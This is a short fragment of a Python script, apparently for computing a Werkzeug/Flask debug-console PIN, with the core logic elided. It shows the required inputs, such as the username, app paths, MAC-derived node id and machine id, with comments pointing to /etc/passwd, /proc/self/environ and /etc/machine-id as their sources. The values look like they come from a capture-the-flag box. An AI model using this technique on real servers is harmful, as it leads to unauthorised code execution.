...
if __name__ == '__main__':
    ...
    usernames = ['www-data'] # /proc/self/status/ ; /etc/passwd ; /proc/self/environ
    modnames = ['flask.app', 'werkzeug.debug'] # possible modnames
    appnames = ['wsgi_app', 'DebuggedApplication', 'Flask'] # possible appnames
    flaskpaths = ['/app/venv/lib/python3.10/site-packages/flask/app.py'] # path to the app (see debug console)
    nodeuuids = ['345052392373'] # /proc/net/arp ; /sys/class/net/<IFACE>/address; python -c "print(0xRESULT.replace(':',''))"
    machineids = ['ed5b159560f54721827644bc9b220d00superpass.service'] # /etc/machine-id + /proc/self/cgroup ; /proc/self/status -> /proc/<PID>/cgroup
